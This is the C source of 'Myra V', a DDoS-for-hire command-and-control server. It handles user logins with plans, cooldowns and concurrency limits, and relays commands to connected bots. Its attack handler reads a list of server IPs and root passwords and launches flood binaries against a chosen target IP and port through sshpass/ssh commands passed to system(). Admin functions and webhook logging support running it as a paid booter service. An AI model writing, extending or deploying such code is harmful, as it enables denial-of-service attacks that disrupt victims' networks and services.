#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <errno.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <math.h>
#include <mysql.h>
#include <my_global.h>

#include "mysql.h"
#include "config.h"
#include "attacks.h"
#include "commands.h"
#include "iplookup.h"

char *os;
const char *slashes[] = {"|", "/", "-", "\\"};
struct epoll_event *events;

char encstr[BLOCK_SIZE];
int max = 0;
FILE *errfd;
MYSQL *con;

const char *login_banner = "\x1b[38;5;225mBooting up Myra V....";

static int epoll_countbots()
{
	int count = 0, i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(bot[i].fd > 0)
			count++;
	}
	return count;
}

static int get_seed()
{
	srand(time(0));
	return(rand() % 0xffff);
}

static void epoll_send_botcount(const int fd)
{
	int i, err, count = 0;
	char *botcount;
	char space[100];
	memset(space, 0, sizeof(space));

	while(1)
	{
		socklen_t socklen = sizeof(err);

		getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &socklen);

		if(fd == 0 || fd == -1 || errno > 0 || err != 0)
			pthread_exit(0);

		if(strlen(broadcast) == 0)
		{
			for(i = 0; i < sizeof(slashes) / sizeof(slashes[i]); i++)
			{
				asprintf(&botcount, "%c]0; [%s] Myra V. [Final] | Clients: %d | %d Concurrent%s. %c", '\033', 
					slashes[i], epoll_get_clients(), epoll_getconcurrents(), epoll_getconcurrents() == 1 ? "" : "s", '\007');
				send(fd, botcount, strlen(botcount), MSG_NOSIGNAL);
				free(botcount);
				usleep(700000);
			}
		}
		else
		{
			asprintf(&botcount, "%c]0; 						%s %c", '\033', broadcast, '\007');
			send(fd, botcount, strlen(botcount), MSG_NOSIGNAL);
			sleep(broadcast_time);
			memset(broadcast, 0, sizeof(broadcast));
		}
	}
}

int epoll_get_clients()
{
	int i, count = 0;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(user[i].name) > 0)
			count++;
	}
	return count;
}

static void epoll_remove_bot(int fd)
{
	memset(bot[fd].name, 0, sizeof(bot[fd].name));
	close(bot[fd].fd);
	bot[fd].fd = -1;
}

static void epoll_add_bot(const int fd, const char *name)
{
	strcpy(bot[fd].name, name);
	bot[fd].fd = fd;
}

static char *epoll_get_name(char *rdbuf)
{
	char *token = strtok(rdbuf, " ");

	while(token != 0)
	{
		token = strtok(0, " ");

		if(strcmp(token, "\x01\x069"))
			break;
		
	}
	epoll_remove_newline(token);
	return token;
}

static int epoll_bot_getcount(const char *rdbuf)
{
	int i, count = 0;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(bot[i].name, rdbuf) == 0)
			count++;
	}
	return count;
}

void epoll_sent_attack(const int fd, int i, int timer, int port, char *target)
{
	char _atk[100];
	strcpy(_atk, atk[i].name);
	int ii;

	for(ii = 0; ii < 9 - strlen(atk[i].type); ii++)
		strcat(_atk, " ");

	char *buffer;
	asprintf(&buffer, "\x1b[38;5;79m╔══════════════════╗\r\n\x1b[38;5;79m║ \x1b[38;5;230mAttack Sent!     \x1b[38;5;79m║ \x1b[38;5;230mIP\x1b[38;5;79m: \e[38;5;204m%s \x1b[38;5;230mPort\x1b[38;5;79m: \e[38;5;204m%d\r\n\x1b[38;5;79m║ \x1b[38;5;230mMethod\x1b[38;5;79m: \e[38;5;204m%s\x1b[38;5;79m║ \x1b[38;5;230mTime\x1b[38;5;79m: \e[38;5;204m%d\r\n\x1b[38;5;79m║ \x1b[38;5;230mThreads\x1b[38;5;79m: \e[38;5;204m2	\x1b[38;5;79m   ║\r\n\x1b[38;5;79m╚══════════════════╝\r\n", 
		target, port, _atk, timer);
	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	free(buffer);
}

static int epoll_tried_bot(const char *rdbuf)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(_tried[i].name, rdbuf) == 0)
			return 0;
	}
	return 1;	
}

static void epoll_bot_command(const int fd)
{
	char *sendbuf;
	int i, curr = 0;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(bot[i].name) > 0)
		{
			if(epoll_tried_bot(bot[i].name))
			{
				asprintf(&sendbuf, "%s: %d\r\n", bot[i].name, epoll_bot_getcount(bot[i].name));
				send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				free(sendbuf);

				strcpy(_tried[curr].name, bot[i].name);
				curr++;
			}
		}
	}

	for(i = 0; i < MAX_CONNS; i++)
		memset(_tried[i].name, 0, sizeof(_tried[i].name));
}

static void epoll_concurrent_attack(char *user, int timer, char *target)
{
	int line, i;
	for(i = 0; i < MAX_CONNS; i++)
	{
		if(conn[i].timer == 0)
		{
			conn[i].start = time(0);
			strcpy(conn[i].username, user);
			conn[i].timer = timer;
			strcpy(conn[i].target, target);
			line = i;
			break;
		}
	}
}

static epoll_close_concurrents()
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(time(0) >= conn[i].start + conn[i].timer)
		{
			memset(conn[i].username, 0, sizeof(conn[i].username));
			conn[i].timer = 0;
			conn[i].start = 0;				
		}
	}
}

static int epoll_add_concurrent(const int index, const char *rdbuf)
{
	int num = 0;
	char *token = strtok(rdbuf, " ");

	while(token != 0)
	{
		if(num == 2 + atk[index].port)
			break;
		num++;
		token = strtok(0, " ");
	}

	printf("%d\n", atoi(token));
	return atoi(token);
}

static void epoll_send_to_clients(const char *user, const int index, const char *rdbuf, const char *attack)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
		send(bot[i].fd, rdbuf, strlen(rdbuf), MSG_NOSIGNAL);
}

void epoll_remove_active_client(const int fd)
{
	int i;
	memset(user[fd].name, 0, sizeof(user[fd].name));
	memset(user[fd].address, 0, sizeof(user[fd].address));
	memset(user[fd].password, 0, sizeof(user[fd].password));
	memset(user[fd].username, 0, sizeof(user[fd].username));
	close(user[fd].fd);
	user[fd].fd = 0;
	return;
}

static void epoll_add_active_client(const int fd, const char *rdbuf)
{
	strcpy(user[fd].name, rdbuf);
	user[fd].fd = fd;
}

static int epoll_already_connected(const char *username)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(username, user[i].name) == 0)
			return 1;
	}
	return 0;
}

static void epoll_parse_attack(time_t cooldown_timer, int line, const int fd, char *rdbuf, const char *user)
{
	int i, port = 0, timer = 0, index = 0;
	char attack[4096], tempbuf[1024], *noti, target[100], *buffer;
	memset(tempbuf, 0, sizeof(tempbuf));
	memset(attack, 0, sizeof(attack));

	for(i = 1; i < strlen(rdbuf); i++)
		tempbuf[i - 1] = rdbuf[i];

	char tempbuf_tokenizer[strlen(tempbuf)];
	strcpy(tempbuf_tokenizer, tempbuf);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) == 0)
			continue;

		if(find_exploit(fd, tempbuf))
			return;

		if(strstr(rdbuf, atk[i].type))
		{
			if(epoll_check_concurrents(db[line].user) == db[line].concurrents)
			{
				send(fd, "\e[38;5;230mYou reached your \e[38;5;204mmaximum amount \e[38;5;230mof \e[38;5;204mconcurrents\e[38;5;230m.\x1b[37m\r\n", 
					strlen("\e[38;5;230mYou reached your \e[38;5;204mmaximum amount \e[38;5;230mof \e[38;5;204mconcurrents\e[38;5;230m.\x1b[37m\r\n"), MSG_NOSIGNAL);
				continue;
			}

			if(time(0) <= cooldown_timer + db[line].cooldown)
			{
				asprintf(&buffer, "\e[38;5;230mYou are on \e[38;5;204mcooldown \e[38;5;230mfor \e[38;5;204m%d \e[38;5;230mseconds\e[38;5;204m.\r\n", 
					db[line].cooldown + cooldown_timer - time(0));
				send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
				free(buffer);
				return;
			}
			cooldown_timer = time(0);

			char *token = strtok(tempbuf_tokenizer, " ");
			int time_index = 3;

			if(atk[i].port == 0)
				time_index--;

			while(token != NULL)
			{
				if(index == 1)
					strcpy(target, token);
				if(index == 2 && atk[i].port == 1)
					port = atoi(token);
				if(index == time_index)
					timer = atoi(token);
				index++;
				token = strtok(0, " ");
			}

			if(timer > db[line].attacktime)
			{
				send(fd, "\e[38;5;230mYou exceeded your \e[38;5;204mmax attack limit\e[38;5;230m.\r\n", 
					strlen("\e[38;5;230mYou exceeded your \e[38;5;204mmax attack limit\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
				return;				
			}

			if(check_blacklisted(con, rdbuf))
			{
				send(fd, "\e[38;5;230mThis \e[38;5;204mIP \e[38;5;230mhas been \e[38;5;204mblacklisted \e[38;5;230mfrom \e[38;5;204mProject Myra\e[38;5;230m.\r\n", 
					strlen("\e[38;5;230mThis \e[38;5;204mIP \e[38;5;230mhas been \e[38;5;204mblacklisted \e[38;5;230mfrom \e[38;5;204mProject Myra\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
				return;
			}

			if(attack_count_args(fd, i, rdbuf))
			{
				epoll_log_attack(con, user, atk[i].type);

				FILE *fp;
				fp = fopen("servers.txt", "r");

				char ip[100], pass[100];

				epoll_remove_newline(attack);

				if(strlen(atk[i].data) > 0)
				{
					strcat(attack, " ");
					strcat(attack, atk[i].data);
				}

				while(1)
				{
					memset(ip, 0, sizeof(ip));
					fscanf(fp, "%s %s", ip, pass);

					if(strlen(ip) == 0)
						break;

					/*
					if(strcmp(atk[i].type, "anubis") == 0)
					{
						char *token = strtok(tempbuf, " ");
						token = strtok(0, " ");
						sprintf(attack, "screen -S \"%s.attack\" -d -m sshpass -p %s ssh -p 885 root@%s \"printf '8\n%s\nrandom\nn\ny\n' | timeout %ds ./greensyn",
							atk[i].type, pass, ip, strtok(token, " "), timer);
					}
					*/
					//sprintf(attack, "screen -S \"%s.attack\" -d -m sshpass -p %s ssh -p 885 root@%s ./%s %s %d %s %d %s",
					//	atk[i].type, pass, ip, atk[i].type, target, port, atk[i].data, timer, atk[i].extradata);
					sprintf(attack, "screen -S \"%s.attack\" -d -m sshpass -p %s ssh -p 885 root@%s screen -S \"%s[%s][%s].attack\" -d -m ./%s %s",
						atk[i].type, pass, ip, atk[i].type, user, target, atk[i].type, target);

					if(atk[i].port == 1)
						sprintf(attack, "%s %d", attack, port);
					sprintf(attack, "%s %s %d %s", attack, atk[i].data, timer, atk[i].extradata);

					system(attack);
				}
				fclose(fp);

				asprintf(&noti, "> **Myra Attack Notification**!\n> **Username**: %s\n> **Attack**: %s", 
					user, tempbuf);
				send_webhook(noti);
				free(noti);

				epoll_concurrent_attack(user, timer, target);
				epoll_sent_attack(fd, i, timer, port, target);
				break;
			}
		}
	}
}

static char random_operator()
{
	const char *operators[] = {'+', '-', '*'};
	return(operators[rand() % sizeof(operators) / sizeof(operators[0])]);
}

static int captcha_solve(int num1, int num2, char operator)
{
	if(operator == '+')
		return(num1 + num2);
	else if(operator == '-')
		return(num1 - num2);
	else if(operator == '*')
		return(num1 * num2);
}


void epoll_send_prompt(const int fd, const char *user)
{
	send(fd, "\e[38;5;204m[\e[38;5;79m", strlen("\e[38;5;204m[\e[38;5;79m"), MSG_NOSIGNAL);
	send(fd, user, strlen(user), MSG_NOSIGNAL);
	send(fd, "\e[38;5;204m@\e[38;5;230mMyra\e[38;5;204m]\e[38;5;154m$\e[38;5;230m \e[?25h", 
		strlen("\e[38;5;204m@\e[38;5;230mMyra\e[38;5;204m]\e[38;5;154m$\e[38;5;230m \e[?25h"), MSG_NOSIGNAL);
}

void negotiation(int sock, unsigned char *buf) 
{
    unsigned char c;

    switch (buf[1]) {
        case CMD_IAC:
            return;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
            c = CMD_IAC;
            send(sock, &c, 1, MSG_NOSIGNAL);
            if (CMD_WONT == buf[1])
                c = CMD_DONT;
            else if (CMD_DONT == buf[1])
                c = CMD_WONT;
            else if (OPT_SGA == buf[1])
                c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
            else
                c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);

            send(sock, &c, 1, MSG_NOSIGNAL);
            send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
            break;

        default:
            break;
    }
}

static void epoll_send_waiting_banner(const int fd)
{
	int i;
	char middle[1024], *load, str[1];
	memset(middle, 0, sizeof(middle));

	for(i = 0; i < 35; i++)
		strcat(middle, " ");


	char *build_banner = "                                \e[38;5;79m[\e[38;5;204mFinal Edition\e[38;5;79m]\r\n";
    char *banner = "                               \e[38;5;230mWelcome To \e[38;5;204mMyra \e[38;5;79mV\e[38;5;230m.\r\n";
    char out [101];

    for(i = 0; i < 10; i++)
    	send(fd, "\r\n", 2, MSG_NOSIGNAL);

    for(i = 0; i < strlen(banner); i++) 
    {
        usleep(30000);
        str[0] = banner[i];

        if(str[0] == '\\')
        	send(fd, "\\", 1, MSG_NOSIGNAL);
        send(fd, str, 1, MSG_NOSIGNAL);
        fflush(stdout);   
    }

    for(i = 0; i < strlen(build_banner); i++) 
    {
        usleep(24000);
        str[0] = build_banner[i];

        if(str[0] == '\\')
        	send(fd, "\\", 1, MSG_NOSIGNAL);
        send(fd, str, 1, MSG_NOSIGNAL);
        fflush(stdout); 
    }

	for(i = 0; i < 101; i++)
	{
		asprintf(&load, "\r%s  \e[38;5;79m[\e[38;5;204m%d\e[38;5;230m%\e[38;5;79m]", middle, i);
		send(fd, load, strlen(load), MSG_NOSIGNAL);
		usleep(30000);
		fflush(stdout);
		free(load);
	}
}

static void epoll_user_client(const int fd)
{
	time_t cooldown_timer = 0;
	int i = 0, succesful = 0, line, ret, num1, num2, loop, each, ii, found = 0;
	char rdbuf[4096], *buffer, *noti, op, *captcha_login;
	memset(user[fd].password, 0, sizeof(user[fd].password));
	memset(user[fd].username, 0, sizeof(user[fd].username));

	srand(time(0));

	op = random_operator();
	num1 = rand() % 10;
	num2 = rand() % 10;

	for(loop = 0; loop < 2; ++loop) 
	{
		for(each = 0; each < 4; ++each) 
		{
			char *loadinganimation;
			asprintf(&loadinganimation, "\r\e[38;5;204mBooting \e[38;5;79mMyra \e[38;5;230mV\e[38;5;204m%.*s   \b\b\b", each, "...");
			fflush(stdout);
            send(fd, loadinganimation, strlen(loadinganimation), MSG_NOSIGNAL);
            usleep(200000);
            free(loadinganimation);
        }
    }

	asprintf(&captcha_login, "\e[38;5;204mMyra \e[38;5;79mV\e[38;5;204m. \e[38;5;230mCaptcha System\e[38;5;204m.\r\n\e[38;5;230mVersion\e[38;5;204m: \e[38;5;204mFinal\e[38;5;230m. \e[38;5;79m[\e[38;5;204m碎\e[38;5;79m]\e[38;5;230m.\r\n\e[38;5;230mOS_Option(s)\e[38;5;204m: \e[38;5;204m%s\r\n\e[38;5;230mDeveloper\e[38;5;204m: \e[38;5;204mTransmissional\e[38;5;230m.\r\n\r\n", 
		os);

	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);

	send(fd, captcha_login, strlen(captcha_login), MSG_NOSIGNAL);
	asprintf(&buffer, "\e[38;5;230mPlease solve\e[38;5;204m:\e[38;5;230m %d %c %d\r\n-> ", 
		num1, op, num2);

	send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	fdgets(fd, rdbuf, sizeof(rdbuf));

	if(captcha_solve(num1, num2, op) != atoi(rdbuf))
	{
		printf("[\e[91mFAILED\e[97m] \e[38;5;230mFD\e[38;5;79m: \e[38;5;204m%d, \e[38;5;230mcaptcha: \e[38;5;230m%d \e[38;5;79m%c \e[38;5;230m%d\e[38;5;79m, \e[38;5;230manswer\e[38;5;79m: \e[38;5;204m%d\e[38;5;79m. \e[38;5;79m(\e[38;5;230muser\e[38;5;79m=\e[38;5;204m%d\e[38;5;79m)\e[37m\n",
			fd, num1, op, num2, captcha_solve(num1, num2, op), atoi(rdbuf));
		send(fd, "\e[38;5;230mFailed captcha\e[38;5;204m.\r\n", strlen("\e[38;5;230mFailed captcha\e[38;5;204m.\r\n"), MSG_NOSIGNAL);
		sleep(3);
		close(fd);
		pthread_exit(0);
	}

	printf("\e[97m[\e[92mCORRECT\e[97m] \e[38;5;230mFD\e[38;5;79m: \e[38;5;204m%d, \e[38;5;230mcaptcha: \e[38;5;230m%d \e[38;5;79m%c \e[38;5;230m%d\e[38;5;79m, \e[38;5;230manswer\e[38;5;79m: \e[38;5;204m%d\e[38;5;79m. \e[38;5;79m(\e[38;5;230muser\e[38;5;79m=\e[38;5;204m%d\e[38;5;79m)\e[37m\n",
		fd, num1, op, num2, captcha_solve(num1, num2, op), atoi(rdbuf));
	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);

	for(ii = 0; ii < MAX_CONNS; ii++)
	{
		if(strcmp(user[fd].address, blacklist[ii].addr) == 0)
		{
			send(fd, "\e[38;5;230mYour \e[38;5;204mIP is \e[38;5;204mblacklisted\e[38;5;230m.\r\n", 
				strlen("\e[38;5;230mYour \e[38;5;204mIP is \e[38;5;204mblacklisted\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
			found = 1;
			close(fd);
			sleep(3);
			return;
		}
	}

	send(fd, "\e[38;5;230mUsername\e[38;5;204m:\e[38;5;79m ", strlen("\e[38;5;230mUsername\e[38;5;204m:\e[38;5;79m "), MSG_NOSIGNAL);
	fdgets(fd, user[fd].username, sizeof(user[fd].username));

	if(strlen(user[fd].username) == 0)
		fdgets(fd, user[fd].username, sizeof(user[fd].username));
	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);

	if(strlen(user[fd].username) > OVERFLOW_STRESS)
	{
		asprintf(&noti, "> **Myra Overflow Notification**!\n> **FD**: %d", 
			user[fd].username, fd);
		send_webhook(noti);
		free(noti);
		close(fd);
		return;
	}

	send(fd, "\e[38;5;230mPassword\e[38;5;204m:\e[38;5;79m \e[?25l\e[38;5;0m", strlen("\e[38;5;230mPassword\e[38;5;204m:\e[38;5;79m \e[?25l\e[38;5;0m"), MSG_NOSIGNAL);
	fdgets(fd, user[fd].password, sizeof(user[fd].password));
	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);

	user[fd].login_count = 0;
	start_database(con);
	cnc_log_mkdir();

	if(strlen(user[fd].password) <= 2)
	{
		close(fd);
		return;
	}

	epoll_remove_newline(user[fd].password);
	_encrypt(user[fd].password);

	line = check_info(con, user[fd].username, user[fd].password);;

	if(line == 696969)
	{
		send(fd, "\e[38;5;230mYour account is \e[38;5;204mexpired\e[38;5;230m.\r\n", strlen("\e[38;5;230mYour account is \e[38;5;204mexpired\e[38;5;230m\r\n"), 
			MSG_NOSIGNAL);
		sleep(3);
		close(fd);
		return;
	}

	else if(line > -1)
		succesful = 1;

	if(succesful == 0)
	{
		send(fd, "\e[38;5;204mIncorrect login\e[38;5;230m.\r\n", strlen("\e[38;5;204mIncorrect login\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
		sleep(3);
		close(fd);
		return;
	}

#ifdef BANNER
	epoll_send_waiting_banner(fd);
	send(fd, "\r\n", 2, MSG_NOSIGNAL);
#endif

	asprintf(&noti, "> **Myra Login Notification**!\n> **Username**: %s\n> **FD**: %d", 
		user[fd].username, fd);
	send_webhook(noti);
	free(noti);

	if(epoll_already_connected(user[fd].username))
	{
		send(fd, "\e[38;5;230mUser is already connected to \e[38;5;204mCNC\e[38;5;230m.\r\n", strlen("\e[38;5;230mUser is already connected to \e[38;5;204mCNC\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
		sleep(3);
		epoll_remove_active_client(fd);
		close(fd);
		return;
	}

	user[fd].seed = db[line].seed;
	db[line].logged_in++;

	user[fd].concurrents = db[line].concurrents;
	epoll_add_active_client(fd, user[fd].username);
	epoll_print_banner(fd);

	pthread_t bCount;
	pthread_create(&bCount, NULL, epoll_send_botcount, fd);

	while(1)
	{
		if(user[fd].chat_enabled == 0)
			epoll_send_prompt(fd, db[line].user);
		else
			epoll_send_chatprompt(fd, db[line].user);

		memset(rdbuf, 0, sizeof(rdbuf));
		//ret = recv(fd, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL);
		ret = fdgets(fd, rdbuf, sizeof(rdbuf));

		// why didn't I think of using getsockopt() earlier, no clue :flushed:
		int err;
		socklen_t socklen = sizeof(err);

		getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &socklen);

		if(ret == 0 || fd == 0 || fd == -1 || errno > 0 || err != 0)
		{
			epoll_remove_active_client(fd);
			asprintf(&noti, "> **Myra Logout Notification**!\n> **Username**: %s\n> **FD**: %d", 
				user[fd].username, fd);
			send_webhook(noti);
			free(noti);
			pthread_exit(0);
		}

		cnc_log_user(db[line].user, "data", rdbuf);
		epoll_remove_newline(rdbuf);

		if(strstr(rdbuf, ".disable-chat"))
		{
			send(fd, "\e[38;5;230mDisabled chat\e[38;5;204m.\r\n", strlen("\e[38;5;230mDisabled chat\e[38;5;204m.\r\n"), MSG_NOSIGNAL);
			user[fd].chat_enabled = 0;
		}

		else if(strstr(rdbuf, ".chat"))
		{
			send(fd, "\e[38;5;230mEnabled chat\e[38;5;204m.\r\n", strlen("\e[38;5;230mEnabled chat\e[38;5;204m.\r\n"), MSG_NOSIGNAL);
			user[fd].chat_enabled = 1;			
		}

		if(user[fd].chat_enabled == 1)
		{
			if(ratelimit_init(fd))
				epoll_send_chat(db[line].user, fd, rdbuf);
			continue;			
		}

		else if(strcmp(rdbuf, "bots") == 0)
			epoll_bot_command(fd);

		else if(strcasecmp(rdbuf, "cls") == 0 || strcasecmp(rdbuf, "clear") == 0)
		{
			send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);
			epoll_print_banner(fd);
		}

		if(rdbuf[0] == PREFIX)
		{
			if(user[fd].cooldown_start + user[fd].cooldown >= time(0))
			{
				asprintf(&buffer, "\e[38;5;230mYou are \e[38;5;204mfrozen for \e[38;5;204m%d \e[38;5;230mseconds\e[38;5;79m!\r\n", 
					user[fd].cooldown_start + user[fd].cooldown - time(0));
				send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);	
				free(buffer);
				continue;
			}

			if(strstr(rdbuf, "lockdown"))
			{
				if(LOCKDOWN == 0)
				{
					send(fd, "\e[38;5;230mCNC is now in \e[38;5;204mlockdown\e[38;5;79m!\r\n", strlen("\e[38;5;230mCNC is now in \e[38;5;204mlockdown\e[38;5;79m!\r\n"), MSG_NOSIGNAL);
					LOCKDOWN = 1;
				}
				else
				{
					send(fd, "\e[38;5;230mCNC is \e[38;5;204mnot in \e[38;5;204mlockdown \e[38;5;230manymore\e[38;5;79m!\r\n", strlen("\e[38;5;230mCNC is \e[38;5;204mnot in \e[38;5;204mlockdown \e[38;5;230manymore\e[38;5;79m!\r\n"), MSG_NOSIGNAL);
					LOCKDOWN = 0;
				}
				continue;
			}

			if(user[fd].locked == 1)
			{
				send(fd, "\e[38;5;230mSorry You got locked out of the cnc\e[38;5;204m. You cannot use any commands as of now\e[38;5;204m.\r\n", 
					strlen("\e[38;5;230mSorry You got locked out of the cnc\e[38;5;204m. You cannot use any commands as of now\e[38;5;204m.\r\n"), MSG_NOSIGNAL);
				continue;				
			}

			if(LOCKDOWN == 1)
			{
				send(fd, "\e[38;5;230mSorry the cnc is in lockdown\e[38;5;204m, you cannot use any commands as of now\e[38;5;204m.\r\n", 
					strlen("\e[38;5;230mSorry the cnc is in lockdown\e[38;5;204m, you cannot use any commands as of now\e[38;5;204m.\r\n"), MSG_NOSIGNAL);
				continue;
			}

			epoll_remove_newline(rdbuf);
			cnc_log_user(db[line].user, "data", rdbuf);

			int index = 0;
			char command[strlen(rdbuf)];
			for(i = 1; i < strlen(rdbuf); i++)
			{
				command[index] = rdbuf[i];
				index++;
			}

			command[strlen(rdbuf) - 1] = 0;

			if(strcmp(command, "pass") == 0)
				change_password(con, fd);

			else if(strcmp(command, "whois") == 0)
				epoll_whois_user(fd);

			else if(strcmp(command, "users") == 0)
				epoll_get_online_users(line, fd);

			else if(strcmp(command, "lookup") == 0)
				iplookup(fd);

			else if(strcmp(command, "attacks") == 0)
				cnc_display_attacks(fd);

			else if(strcmp(command, "logout") == 0)
				close(fd);

			else if(strcmp(command, "broadcast") == 0)
				broadcast_message(fd);

			else if(strcmp(command, "nmap") == 0)
				epoll_nmap_user(fd);

			else if(strcmp(command, "kill") == 0)
				kill_attack(db[line].user, fd);

			else if(strcmp(command, "detail-attacks") == 0)
				epoll_get_concurrents(fd);

			else if(strcmp(command, "account") == 0)
				get_user(con, fd);

			else if(strcmp(command, "menu") == 0)
				attack_menu(fd);

			else if(strcmp(command, "ranking") == 0)
				epoll_get_user_ranking(con, fd);

			else if(strcmp(command, "popularity") == 0)
				get_popularity(con, fd);

			if(strcmp(db[line].type, "admin") == 0)
			{
				if(strcmp(command, "exit-log") == 0)
				{
					send(fd, "\r\nYou have exited logging mode.\r\n",
						strlen("\r\nYou have exited logging mode.\r\n"), MSG_NOSIGNAL);
					user[fd].logging = 0;
				}
	
				else if(strcmp(command, "log") == 0)
				{
					send(fd, "\r\nYou have entered logging mode.\r\n",
						strlen("\r\nYou have entered logging mode.\r\n"), MSG_NOSIGNAL);
					user[fd].logging = 1;
				}

				else if(strcmp(command, "unblacklist-ip") == 0)
					epoll_unblacklist_ip(fd);

				else if(strcmp(command, "blacklist-ip") == 0)
					epoll_blacklist_ip(fd);

				else if(strcmp(command, "unblacklist-attack") == 0)
					epoll_unblacklist_ip_attack(con, fd);

				else if(strcmp(command, "blacklist-attack") == 0)
					epoll_blacklist_attack_ip(con, fd);	

				else if(strcmp(command, "reset-password") == 0)
					reset_password(con, fd);

				else if(strcmp(command, "cooldown-user") == 0)
					epoll_cooldown_user(fd, rdbuf);

				else if(strcmp(command, "lock-user") == 0)
					epoll_lock_user(fd, rdbuf);

				else if(strcmp(command, "unlock-user") == 0)
					epoll_unlock_user(fd, rdbuf);

				else if(strcmp(command, "killall-attacks") == 0)
					killall_attacks(fd);

				else if(strcmp(command, "reset-popularity") == 0)
					mysql_query(con, "DELETE FROM attacks") == 0;

				else if(strcmp(command, "add-user") == 0)
					epoll_add_user(con, fd);
	
				else if(strcmp(command, "del-user") == 0)
					epoll_remove_user(con, fd);
	
				else if(strcmp(command, "kickuser") == 0)
					epoll_kick_user(line, fd);
			}
			epoll_parse_attack(cooldown_timer, line, fd, rdbuf, db[line].user);
		}
	}
}

static void epoll_server(const uint16_t port)
{
	char rdbuf[1024], buf[8096];;
	int epfd, fd, afd, i, ii, ret, opt = 1, efd = 0, eventlen, found;

	events = calloc(MAX_CONNS, sizeof(struct epoll_event));

	fd = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));

	//fcntl(fd, F_SETFL, O_NONBLOCK);

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	bind(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
	listen(fd, MAX_CONNS);

	epfd = epoll_create(MAX_CONNS);

	struct epoll_event ev;
	ev.events = EPOLLIN;
	ev.data.fd = fd;

	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);

	while(1)
	{
		found = 0;

		eventlen = epoll_wait(epfd, events, MAX_CONNS, 10000);

		epoll_close_concurrents();
 		//ratelimit_close_connections(epfd);

		for(i = 0; i < eventlen; i++)
		{
			if(events[i].data.fd == fd)
			{
				socklen_t socklength = sizeof(struct sockaddr_in);

				if((afd = accept(fd, (struct sockaddr *)&addr, &socklength)) > 0)
				{
					int err;
					socklen_t errlen = sizeof(err);
					getsockopt(user[afd].fd, SOL_SOCKET, SO_ERROR, &err, &errlen);

					if(err != 0 || user[afd].fd > 0)
						epoll_remove_active_client(afd);

					if(found == 0)
					{
						int n;
						//fcntl(afd, F_SETFL, O_NONBLOCK);
						//n = recv(afd, buf, sizeof(buf), MSG_NOSIGNAL);
						//negotiation(afd, buf);

						strcpy(bot[afd].address, inet_ntoa(addr.sin_addr));
						strcpy(user[afd].address, inet_ntoa(addr.sin_addr));
#ifdef DEBUG	
						//printf("[+] file descriptor: %d\n", afd);
#endif
						if(LOCKDOWN == 1)
						{
							send(events[i].data.fd, "\e[38;5;230mCNC is currently in \e[38;5;204mlockdown\e[38;5;230m!\r\n", 
								strlen("\e[38;5;230mCNC is currently in \e[38;5;204mlockdown\e[38;5;230m!\r\n"), MSG_NOSIGNAL);
							continue;
						}

						pthread_t thread;

						strcpy(user[afd].address, inet_ntoa(addr.sin_addr));
						pthread_create(&thread, NULL, epoll_user_client, afd);
						memset(rdbuf, 0, sizeof(rdbuf));
					}
				}
			}
		}
	}
}

static void pidwatch()
{
	char *buff;
	asprintf(&buff, "screen -d -m python3 tools/pidwatcher.py %d", getpid());
	system(buff);
	free(buff);
}

int main()
{
	errfd = fopen("user-logs/error-log.txt", "a");
	stderr = errfd;

	os = get_os();

#ifdef PIDWATCH
	pidwatch();
#endif

	con = mysql_init(NULL);
	mysql_real_connect(con, SERVER, USER, PASS, DATABASE, 3306, NULL, 0);

	add_plans();
	//setup_database();
	printf("\e[38;5;79m[\e[38;5;204m%s\e[38;5;79m] \e[38;5;230mStarted CNC\e[38;5;204m, \e[38;5;230mport\e[38;5;204m: \e[38;5;79m558\n", __DATE__);
	console_log("Cnc started.");

	cnc_add_attacks();
	send_webhook("> **CNC started on port 558**");

	epoll_server(558);
}
